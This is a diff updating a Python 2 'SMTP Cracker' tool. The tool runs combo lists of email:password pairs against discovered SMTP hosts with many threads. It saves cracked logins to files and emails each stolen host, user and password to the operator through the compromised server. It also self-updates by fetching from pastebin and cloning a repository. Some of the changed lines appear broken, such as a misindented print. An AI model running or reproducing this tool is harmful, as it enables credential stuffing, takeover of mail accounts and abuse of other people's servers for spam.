@@ -4,8 +4,8 @@
 #Don't Change copyright Mother Fucker :)
 #Tunisia Coderz
 #Tool Finished In : 01:22 10/03/2019
-#last Update in : 12:06 17/03/2019
-import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re
+#Tool Fixed in : 15:33 10/06/2019
+import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re,uuid
 try:
   if os.name=='nt':
    os.system('cls')
@@ -17,23 +17,7 @@ msg0 ="\033[91m########## verified Your modules ########"
 for i in msg0:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.1)
-try: 
- import emoji
-except:
-  print"\033[91m[\033[92m?\033[91m] Installing emoji Module\033[00m"
-  if os.name=='nt':
-    try:
-      os.system('C:\Python27\Scripts\pip2.exe install emoji')
-      import emoji
-    except:
-      sys.exit("\n\033[91m[\033[92m?\033[91m] \033[91mInstall Python-Pip Sir Before use tool !\033[00m")
-  else:
-    try:
-      os.system('pip2 install emoji')
-      import emoji
-    except:
-      print "\033[91m[\033[92m?\033[91m] \033[91mTry To Install pip2 For Your Devices And Try 'root@usr:~$ pip2 install emoji'\033[00m"
+        time.sleep(0.02)
 try: 
  import Queue
 except:
@@ -57,7 +41,7 @@ except:
   print"\033[91m[\033[92m?\033[91m] Installing requests Module\033[00m"
   if os.name=='nt':
     try:
-      os.system('cd:\Python27\Scripts\pip2.exe install requests')
+      os.system('C:\Python27\Scripts\pip2.exe install requests')
     except:
       print "Install Python-Pip Sir"
       raw_input('')
@@ -69,7 +53,7 @@ except:
   print"\033[91m[\033[92m?\033[91m] Installing colorama Module\033[00m"
   if os.name=='nt':
     try:
-      os.system('cd:\Python27\Scripts\pip2.exe install colorama')
+      os.system('C:\Python27\Scripts\pip2.exe install colorama')
     except:
       print "Install Python-Pip Sir"
       raw_input('')
@@ -79,26 +63,18 @@ msg00 ="\n\033[92m##### GOOd Now You have all modules #####\n\033[0;96m#########
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.1)
-def hello():
- try:
-  if os.name=='nt':
-   os.system('cls')
-  else:
-   os.system('clear')
- except:
-    print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
+        time.sleep(0.02)
 def aron():
  try:
   if os.name=='nt':
-   hello()
-   os.system('cd SMTP-Mail.acess-Cracker-Checker && smtp.py')
+   os.system('cls && cd Smtp-cracker && smtp.py')
   else:
-   hello()
-   os.system('cd SMTP-Mail.acess-Cracker-Checker && python2 smtp.py')
+   os.system('clear && cd Smtp-cracker && python2 smtp.py')
  except:
     print("\033[91mERROR :| \nConatct ARON-TN AS u LIKE !\033[00m")
 to_check={}
+from colorama import *
+init()
 print '\033[1m'
 class IMAP4_SSL(imaplib.IMAP4_SSL):
     def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
@@ -145,7 +121,6 @@ class checkerr(threading.Thread):
 			self.i=i
 			self.connected=True
 		except Exception,e:
-			print str(e)
 			i.close()
 			self.connected=False
 	def find(self):
@@ -176,34 +151,29 @@ class checkerr(threading.Thread):
 							self.spam=folder
 					else:
 						break
-		print '\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[00m\n'
 		self.i.select(self.inbox)
 		found=[]
 		for k,t in enumerate(to_check):
 			rez=self.i.search(None,'SUBJECT',t[0])
 			times=time.time()-t[1]
 			if times-2>self.timeout:
-				save=open('checked_smtp.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
 				found.append(k)
 			if len(rez)>0:
-				save=open('checked_smtp.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
 				found.append(k)
 		self.i.select(self.spam)
 		for k,t in enumerate(to_check):
 			rez=self.i.search(None,'SUBJECT',t[0])
 			times=time.time()-t[1]
 			if times-2>self.timeout:
-				save=open('checked_smtps.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
 				found.append(k)
 			if len(rez)>0:
-				save=open('checked_smtp.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
 				found.append(k)
 		new=[]
 		for k,v in enumerate(to_check):
 			if k not in found:
 				new.append(v)
 		to_check=new
-		print to_check
+		print '\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[97m '+to_check+'\n'
 	def run(self):
 		global to_checks
 		while self.work:
@@ -246,10 +216,10 @@ class consumer(threading.Thread):
 	def addBad(self,ip):
 		global bads,rbads
 		if rbads:
-			save=open('trash.txt','a').write(ip+'\n')
 			bads.append(ip)
 		return -1
 	def findHost(self,host):
+		print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on \033[97m'+host+'\n'
 		global cache,bads,rbads
 		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		s.setblocking(0)
@@ -264,16 +234,14 @@ class consumer(threading.Thread):
 			except Exception,e:
 				if rbads:
 					bads.append(host)
-					save=open('trash.txt','a').write(host+'\n')
 				return None
 		except KeyError:
 			pass
-		print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on\033[00m '+host+'\n'
 		cache[host]=[-1,-1]
 		for i,p in enumerate(self.ports):
 			for j,h in enumerate(self.hosts):
+				print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)+'\n'
 				try:
-					print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[00m '+h+host+':'+str(p)+'\n'
 					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					s.setblocking(0)
 					s.settimeout(self.timeout)
@@ -286,7 +254,6 @@ class consumer(threading.Thread):
 					continue
 		bads.append(host)
 		del cache[host]
-		save=open('trash.txt','a').write(host+'\n')
 		return None
 	def getPass(self,passw,user,domain):
 		passw=str(passw)
@@ -310,7 +277,6 @@ class consumer(threading.Thread):
 				parts=user.split('.')
 			elif '_' in user:
 				parts=user.split('_')
-			print parts				
 			try:
 				h=passw.replace('%part','').split('%')[0]
 				i=int(h)
@@ -320,7 +286,7 @@ class consumer(threading.Thread):
 				return None
 		return passw
 	def connect(self,tupple,ssl=False):
-		global bads,cracked,cache,email,successful
+		global bads,cracked,cache,email
 		host=tupple[0].rstrip()
 		host1=host
 		user=tupple[1].rstrip()
@@ -341,7 +307,7 @@ class consumer(threading.Thread):
 		if port=="465":
 			port+="(SSL)"
 		host=self.hosts[cache[host][0]]+host
-		print '\033[91m[\033[92m*\033[91m]\033[92mTrying >\033[00m '+host+":"+port+" "+user+" "+passw+'\n'
+		print '\033[91m[\033[92m*\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw+'\n'
 		try:
 			banner=s.recv(1024)
 			if banner[0:3]!="220":
@@ -364,7 +330,7 @@ class consumer(threading.Thread):
 				self.sendCmd(s,'QUIT')
 				s.close()
 				return 0
-			print '\n\033[93m[\033[90m>\033[00m]\033[91m B\033[94m0\033[95mM\033[92m \033[93mC\033[90mr\033[92ma\033[94mC\033[91mke\033[94md \033[92m>\033[90m  '+host+':'+port+' '+user+' '+passw+'\n'
+   			print '\n\033[93m[\033[90m>\033[00m]\033[91m B000M Cracked >\033[97m '+host+':'+port+' '+user+' '+passw+'\n'
 			save=open('cracked_smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
 			save=open('cracked_Mailaccess.txt','a').write(user+":"+passw+"\n")
 			cracked.append(host1)
@@ -374,7 +340,6 @@ class consumer(threading.Thread):
 				s.close()
 				return self.addBad(host1)
 			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
-			print rez
 			if rez[0:3]!='250':
 				self.sendCmd(s,'QUIT')
 				s.close()
@@ -385,9 +350,10 @@ class consumer(threading.Thread):
 				s.close()
 				return self.addBad(host1)
 			rez=self.sendCmd(s,'DATA')
-			headers='From: ðŸ‘» SMTP CRACKER V2 ðŸ‘» <'+user+'> \r\n'
+			headers='From: <'+user+'> ARON-TN\r\n'
 			headers+='To: '+email+'\r\n'
-			headers+='Subject:New Smtp Result By ARON-TN\r\n'
+			headers+='Reply-To: '+email+'\r\n'
+			headers+='Subject: SMTP Cracker User-ID Num: ['+randomString+']\r\n'
 			headers+='MIME-Version: 1.0\r\n'
 			headers+='Content-Transfer-encoding: 8bit\r\n'
 			headers+="Content-type: text/html; charset=utf-8\r\n";
@@ -396,34 +362,33 @@ class consumer(threading.Thread):
 			headers+='X-MSmail-Priority: High\r\n'
 			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
 			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
-			headers+='''<html>
+			headers+='''<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8" >
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{font-family: "Trebuchet MS", Helvetica, sans-serif;}
-</style>
 </head>
 <body>
-<div class="main" style="background: -webkit-linear-gradient(green,#F3431D,green);
-background: -moz-linear-gradient(green,#F3431D,green);
-background: -o-linear-gradient(green,#F3431D,green);
-            border: 1px solid #0B4A89;
-            border-radius: 11px;
-            color: #fff;">
-<center><h1><i><font color="red">SMTP Cracker V2 </font><font color="blue">By ARON-TN</font></i></h1></center>         
-<b>Hi, </b><br/><b>NEW SMTP RESULT  </b><br/><b> SMTP INFO : </b><br/>
-<b>  Host : '''+host+'''</b><br/><b> Port : '''+port+'''<br>
-  User  : '''+user+'''<br>
-  Password  : '''+passw+'''<br><br><font color="blue"> /!\ WARNING /!\ <br> i don't accept any responsibility for any illegal usage !</font><br><br>
-  Contact Coder(ARON-TN)  <br>  Email : aron.tn.official@gmail.com<br>
-  Youtube : <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><font>© ARON-TN 2017-2019</font></b></body></html>'''
+	<center>
+		<br><br><br>
+		<h1>[ > ]New Smtp Cracker V2.1 [ < ]</h1> <br>
+		<font color="#f16f6f"><h1>[ ! ]Developped by ARON-TN [ ! ]</h1></font><br><br><br>
+		<font size="6" color="red">/!\ WARNING /!\ <br><font color="red" size="6" ><"/">i don't accept any responsibility for any illegal usage !</font><"/"></font><br><br>
+		<font color="black" size="5" ><font color="red">Host :</font> '''+host+''' </font><br><br>
+		<font color="black" size="5" ><font color="red">Port :</font> '''+port+'''<br><br></font>
+		<font color="black" size="5" ><font color="red">Email :</font> '''+user+'''<br><br></font>
+		<font color="black" size="5" ><font color="red">Password :</font> '''+passw+'''<br><br></font>
+		<center><img src="http://lh6.googleusercontent.com/-AXuIH_cHGOQ/UUzEKLtQ0EI/AAAAAAAAAGI/jw2FhilfMo4/s298-no/TrollFaceDancing_large.gif"/>
+		</center><br><br><br>
+		<font color="black" size="5" ><font color="red">Email :</font> aron.tn.official@gmail.com <br><br></font>
+		<font color="black" size="5" ><font color="red">Youtube :</font> <a href="https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA">Click HEre</a><br><br></font>
+		<h2>© ARON-TN 2017-2019</h2>
+	</body>
+	</html>\r\n.\r\n'''
 			s.send(headers)
 			rez=s.recv(1000)
+			
 			self.sendCmd(s,'QUIT')
 			s.close()
 		except Exception,e:
-			save=open('trash.txt','a').write(host+":"+port+":"+str(e)+"\n")
 			s.close()
 			return self.addBad(host1)
 	def run(self):
@@ -431,67 +396,69 @@ background: -o-linear-gradient(green,#F3431D,green);
 			cmb=self.q.get()
 			self.connect(cmb)
 			self.q.task_done()
+randomString = uuid.uuid4().hex
+randomString = randomString.upper()[0:7]
 quee=Queue.Queue(maxsize=20000)
 try:
- save=open('about.txt','a').write('+++++++++++++\nCoded By ARON-TN \n contact me ! \n{!}youtube : https://www.youtube.com/channel/UCuk4DSWDGxdZnHbrqVz0ZZA \nCopyright ARON-TN 2k19\n+++++++++++++\n')
- tld=open('about.txt','r').read().splitlines()
+ os.remove('about.txt')
 except:
- sys.exit("\033[91m{!} about.txt not Founded :/ \n Please Create file.txt rename it to about.txt \n thnx For Using My Tool <3\033[00m")
+ pass
+save=open('about.txt','a').write('Hello \n Welcome Again Smtp Cracker Available & Fixed :) \n [+] Developped By ARON-TN \n Thanks To : #Mr.Zack ** #Alpicino \n [*] Youtube > youtube.com/AronTNxOfficial')
+tld=open('about.txt','r').read().splitlines()
 tlds=cache={}
 bads=[]
 cracked=[]
 rbads=0
-try:
- inputs=open(sys.argv[1],'r').read().splitlines()
- thret=sys.argv[2]
- thret=200
-except:
- print('''
-   \033[90m_     _       \033[94m______   __       __  ________  _______      \033[90m_     _  
-  (c).-.(c)     \033[94m/      \ /  \     /  |/        |/       \    \033[90m(c).-.(c)
-   / ._. \     \033[94m/$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |    \033[90m/ ._. \ 
- __\( Y )/__   \033[94m$$ \__$$/ $$$  \ /$$$ |   $$ |   $$ |__$$ |  \033[90m__\( Y )/__ 
-(_.-/'-'\-._)  \033[94m$$      \ $$$$  /$$$$ |   $$ |   $$    $$/  \033[90m(_.-/'-'\-._)
-   || A ||      \033[94m$$$$$$  |$$ $$ $$/$$ |   $$ |   $$$$$$$/      \033[90m|| R ||
- _.' `-' '._   \033[94m/  \__$$ |$$ |$$$/ $$ |   $$ |   $$ |        \033[90m_.' `-' '._  
-(.-./`-'\.-.)  \033[94m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[90m(.-./`-'\.-.) 
- `-'     `-'    \033[94m$$$$$$/  $$/      $$/    $$/    $$/         \033[90m`-'     `-'
-                \033[91m[\033[92m+\033[91m]\033[93m(C)opyright > Github.com/ARON-TN\033[91m[\033[92m+\033[91m]
-               \033[91m[\033[92m+\033[91m] SMTP CRACKER V2 CODED BY ARON-TN \033[91m[\033[92m+\033[91m]
-              \033[91m[\033[92m+\033[91m]\033[92m EMail : aron.tn.official@gmail.com \033[91m[\033[92m+\033[91m]
-             \033[91m[\033[92m+\033[91m]\033[93mFacebook >  https://fb.com/amyr.gov.tn\033[91m[\033[92m+\033[91m]
-''')
- ms0g ="\n\033[93mChecking\033[0;96m Your\033[91m Version\033[92m ...\n\n"
- for i in ms0g:
+vers=requests.get('https://pastebin.com/raw/WuWLQk73').text.encode('utf-8')
+print('''
+   \033[0;96m_     _       \033[93m______   __       __  ________  _______      \033[0;96m_     _  
+  (c).-.(c)     \033[93m/      \ /  \     /  |/        |/       \    \033[0;96m(c).-.(c)
+   / ._. \     \033[93m/$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |    \033[0;96m/ ._. \ 
+ __\( Y )/__   \033[93m$$ \__$$/ $$$  \ /$$$ |   $$ |   $$ |__$$ |  \033[0;96m__\( Y )/__ 
+(_.-/'-'\-._)  \033[93m$$      \ $$$$  /$$$$ |   $$ |   $$    $$/  \033[0;96m(_.-/'-'\-._)
+   || A ||      \033[93m$$$$$$  |$$ $$ $$/$$ |   $$ |   $$$$$$$/      \033[0;96m|| R ||
+ _.' `-' '._   \033[93m/  \__$$ |$$ |$$$/ $$ |   $$ |   $$ |        \033[0;96m_.' `-' '._  
+(.-./`-'\.-.)  \033[93m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[0;96m(.-./`-'\.-.) 
+ `-'     `-'    \033[93m$$$$$$/  $$/      $$/    $$/    $$/         \033[0;96m`-'     `-'
+               \033[91m[\033[92m+\033[91m]\033[1m(C)opyright > Github.com/ARON-TN\033[91m [\033[92m+\033[91m]
+              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V2.1 DEVEL BY ARON-TN \033[91m[\033[92m+\033[91m]
+             \033[91m[\033[92m+\033[91m]\033[92m   Mail : aron.tn.official@gmail.com  \033[91m[\033[92m+\033[91m]
+            \033[91m[\033[92m+\033[91m]\033[94m Facebook >  https://fb.com/amyr.gov.tn \033[91m[\033[92m+\033[91m]
+           \033[91m[\033[92m+\033[91m]   Youtube > youtube.com/AronTNxOfficial  \033[91m[\033[92m+\033[91m]''')
+ms0g ="\n\033[93mChecking\033[0;96m Your\033[91m Version (%s)\033[92m "%vers
+for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
- vers=requests.get('https://gist.githubusercontent.com/aron-tn/edecab7db5849e16fc9c77ad14eba0b3/raw/aaec54e2fa507c3afde04e2551cb639e3aaa7c03/gistfile1.txt').text.encode('utf-8')
- if vers=='ARON-TN@2.0@ARON-TN':
-  print('\033[91m{\033[94m>\033[91m} \033[91mG\033[94mo\033[92mo\033[91md \033[94mY\033[92mo\033[91mu\033[94m H\033[92ma\033[92mv\033[91me\033[94m L\033[92ma\033[91ms\033[94mt\033[92m V\033[91me\033[94mr\033[92ms\033[91mi\033[94mo\033[92mn\033[91m \n')
- else:
-  print("\033[91mThere IS NEW Update\033[94m :\ \033[92mDo you Want To Download it ? \033[00m")
-  ok=raw_input('''
-  \033[91m[\033[94m1\033[91m]\033[00m YEs
-  \033[91m[\033[94m2\033[91m]\033[00m No
- \033[91m[\033[94m>\033[91m]\033[00m : ''')
-  if ok=='1':
-   aroon ="\n\033[91m[\033[94m*\033[91m]\033[00m Thanks <3\n"
-   for i in aroon:
-        sys.stdout.write(i)
-        sys.stdout.flush()
-        time.sleep(0.1)
-   os.remove(sys.argv[0])
-   os.system('git clone https://github.com/aron-tn/SMTP-Mail.acess-Cracker-Checker')
-   aron()
-  elif ok=='2':
-   pass
- try:
-  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[93m'),'r').read().splitlines()
- except:
+if vers=='2.1':
+  print('{>} Good You have last version \n')
+else:
+ print("\033[91mThere is New Version available !! Do you Want To Update Your tool ? \033[00m")
+ ok=raw_input('''
+   \033[91m[\033[94m1\033[91m]\033[00m YEs
+   \033[91m[\033[94m2\033[91m]\033[00m No
+  \033[91m[\033[94m>\033[91m]\033[00m : ''')
+ if ok=='1':
+  aroon ="\n Update Strated !\n"
+  for i in aroon:
+   sys.stdout.write(i)
+   sys.stdout.flush()
+   time.sleep(0.02)
+  os.remove(sys.argv[0])
+  os.system('git clone https://github.com/aron-tn/Smtp-cracker && cd Smtp-cracker')
+  if os.name=='nt':
+   os.system('cls')
+  else:
+   os.system('clear')
+  os.system('smtp.py')
+ elif ok=='2':
+  pass
+try:
+  inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m'),'r').read().splitlines()
+except:
 	sys.exit("\n\033[91m{!} Your File not Founded\033[00m")
- email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email : ')
- thret=200
+email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
+thret=200
 def part():
 	global tld,tlds
 	for i in tld:
@@ -511,11 +478,11 @@ for i in range(int(thret)):
 		print "\033[91m{!} Working only with %s threads\033[00m"%i
 		break
 try:
-	for i in inputs:
-		user = i.split(':')[0]
-		password = i.split(':')[1]
-		user = user.lower()
-		quee.put((user.split('@')[1], user, password))
+    for i in inputs:
+        user = i.split(':')[0]
+        password = i.split(':')[1]
+        user = user.lower()
+        quee.put((user.split('@')[1], user, password))
 except:
 	pass
 quee.join()
